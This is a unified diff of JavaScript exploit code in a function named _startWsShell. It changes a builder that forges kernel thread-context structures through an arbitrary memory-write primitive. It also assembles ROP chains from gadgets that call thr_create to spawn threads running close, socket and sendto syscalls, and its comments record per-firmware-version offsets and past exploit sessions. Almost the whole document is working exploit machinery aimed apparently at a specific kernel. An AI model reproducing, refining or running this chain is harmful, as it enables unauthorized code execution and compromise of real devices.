@@ -8247,16 +8247,16 @@ function _startWsShell(){
                   0x178:0xFFFFn,0x188:0xFFFFn,0x198:0xFFFFn,0x1A8:0xFFFFn,
                   0x1D0:0x8180000000000000n,0x1D8:0x4007n,
                   0x230:0x3FF0000000000000n,0x270:0xFFFFFFFFFFFFFFFFn,0x278:0xFFFFFFFFFFFFFFFFn};
-          /* THE KERNEL-TRUE CTX BUILDER (session 229d: the 13.60 mc
-           * converter disassembly - the definitive field map):
-           *   mc_len@ctx+0x88 MUST BE 0x480 (the first gate)
-           *   flags@ctx+0x90: <=7; bit0 arms selectors, bit1 arms FS/GS
-           *   bases - flags=0: the child INHERITS default TLS/selectors
-           *   type@ctx+0xD0: 0x10000 or 0x10002
-           *   subtype@ctx+0xD8: 0x20000 REQUIRED with type 0x10000
-           *                    (THE NO-FP PATH - no FP area at all)
-           *   GPRs ctx+0x48..0xB8 copied 1:1; RIP@ctx+0xA0 RSP@ctx+0xB8
-           * NO CS/SS/RFLAGS gates needed - flags=0 skips them entirely. */
+          /* THE KERNEL-TRUE CTX BUILDER (session 229g: the corpus 80d
+           * 14.10-PROVEN gates - it SPAWNED rv=0 on 14.10 - and the
+           * 13.60 mc-converter disassembly with rsi=mc=ctx+0x40:
+           *   magic/mc_len@ctx+0x108 = 0x480 (the first gate)
+           *   flags@ctx+0xD0: <=7; bit0 arms selectors, bit1 FS/GS
+           *   type@ctx+0x110: 0x10000/0x10002
+           *   subtype@ctx+0x118: 0x20000 with type 0x10000 (no-FP)
+           *   GPRs ctx+0x48..0xB8 1:1; RIP@ctx+0xA0-of-mc=ctx+0xE0;
+           *   RSP@ctx+0xF8. Belt+braces (80d wrote them too): the
+           *   0x43/0x3B selectors and the +0xC0 CS slot. */
           function buildCtx(base,g,live){ /* live=true for THE SCOPE ONLY:
            * NO bulk zeroing (the srop12-25 lesson); scratch ctxs zero. */
             if(!live){for(var z=0;z<0x120/8;z++)S.absWrite(base+BigInt(z*8),0n);}
@@ -8264,12 +8264,14 @@ function _startWsShell(){
             S.absWrite(base+0x058n,g.rdx);S.absWrite(base+0x060n,g.rcx||0n);
             S.absWrite(base+0x068n,g.r8||0n);S.absWrite(base+0x070n,g.r9||0n);
             S.absWrite(base+0x078n,g.rax||0n);
-            S.absWrite(base+0x088n,0x480n);     /* mc_len - GATE 1 */
-            S.absWrite(base+0x090n,0n);         /* flags=0: inherit TLS/CS */
-            S.absWrite(base+0x0A0n,g.rip);      /* RIP */
-            S.absWrite(base+0x0B8n,g.rsp);      /* RSP */
-            S.absWrite(base+0x0D0n,0x10000n);   /* type */
-            S.absWrite(base+0x0D8n,0x20000n);   /* subtype (no-FP path) */
+            S.absWrite(base+0x0C0n,0x43n);       /* CS belt+braces (80d) */
+            S.absWrite(base+0x0D0n,0n);          /* flags = 0 */
+            S.absWrite(base+0x0E0n,g.rip);       /* RIP */
+            S.absWrite(base+0x0F8n,g.rsp);       /* RSP */
+            S.absWrite(base+0x100n,0x3Bn);       /* SS belt+braces (80d) */
+            S.absWrite(base+0x108n,0x480n);      /* magic/mc_len - GATE 1 */
+            S.absWrite(base+0x110n,0x10000n);    /* type */
+            S.absWrite(base+0x118n,0x20000n);   /* subtype (no-FP path) */
           }
           /* EXIT_SLOT: every spawned child's ret lands here -> thr_exit */
           S.absWrite(A_EXIT,THR_EXIT);
@@ -8284,11 +8286,48 @@ function _startWsShell(){
            * No fd guessing, no reliance on pooled connections. */
           var ctxAddr=[];
           var ctxAddrPush=function(g){var ca=A_CTXG+BigInt(ctxAddr.length)*0x120n;ctxAddr.push(ca);buildCtx(ca,g);return ca;};
+          /* RUNG 0 - THE CLEAN-ARGS THR_CREATE (Track A, session 229h):
+           * the corpus's EXACT call shape: thr_create(ctx2, &WIT, 0) -
+           * RSI=a real writable buffer (NOT cfr), RDX=0 (flags=0). If
+           * the parent's fire errors on the stale RDX/RSI but THIS
+           * child-side call spawns, the errno source is CONFIRMED and
+           * the child chain works. ctx2 = the close-range witness ladder. */
+          var A_CTX2=LAD_BASE+0x2000n; /* the rung-0 child's own spawn ctx list */
+          /* ctx2's child = the close-range witness walker (reuse the same
+           * rung ctxs - a SECOND walker walking the SAME chain is fine,
+           * idempotent closes + socket + sendto). */
+          var ctxAddr2=[];
+          var ctxAddr2Push=function(g){var ca=A_CTX2+0x800n+BigInt(ctxAddr2.length)*0x120n;ctxAddr2.push(ca);buildCtx(ca,g);return ca;};
           for(var cf=3;cf<=9;cf++){
-            ctxAddrPush({rdi:BigInt(cf),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT}); /* close(fd) */
+            ctxAddr2Push({rdi:BigInt(cf),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT}); /* close(fd) */
           }
-          ctxAddrPush({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});          /* socket(2,2,0) */
-          ctxAddrPush({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT}); /* sendto(3,...) */
+          ctxAddr2Push({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});          /* socket(2,2,0) */
+          ctxAddr2Push({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT}); /* sendto(3,...) */
+          /* rung-0's ctx: spawn the close-range walker's ctx[0], then walk
+           * ctxAddr2's chain itself - the walker function shape: */
+          buildCtx(A_CTX2,{rdi:ctxAddr2[0],rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:LAD_BASE+0x2C00n});
+          /* rung-0's chain (the pop-rdi ladder over ctxAddr2) */
+          var ch2=LAD_BASE+0x2C00n,qw2=0;
+          for(var r2=0;r2<ctxAddr2.length;r2++){
+            S.absWrite(ch2+BigInt((qw2++)*8),POP_RDI_RBP_RET);
+            S.absWrite(ch2+BigInt((qw2++)*8),ctxAddr2[r2]);
+            S.absWrite(ch2+BigInt((qw2++)*8),0n);
+            S.absWrite(ch2+BigInt((qw2++)*8),THR_CREATE);
+          }
+          S.absWrite(ch2+BigInt((qw2++)*8),POP_RDI_RBP_RET);
+          S.absWrite(ch2+BigInt((qw2++)*8),0n);
+          S.absWrite(ch2+BigInt((qw2++)*8),0n);
+          S.absWrite(ch2+BigInt((qw2++)*8),THR_EXIT);
+          /* the parent's chain: rung-0 ONLY (the clean-args thr_create
+           * child) - everything else is the child's own job. */
+          ctxAddr.push(A_CTX2);
+          /* ALSO the parent's own direct witness (keep the close-range
+           * ladder on the parent side as the parallel witness): */
+          for(var cf2=3;cf2<=9;cf2++){
+            ctxAddrPush({rdi:BigInt(cf2),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});
+          }
+          ctxAddrPush({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
+          ctxAddrPush({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
           buildCtx(A_CTXS,{rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
           if(A_CTXG+BigInt(ctxAddr.length)*0x120n>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
           /* chainR: [POP_RDI_RBP_RET, CTX, 0, thr_create] per child, then
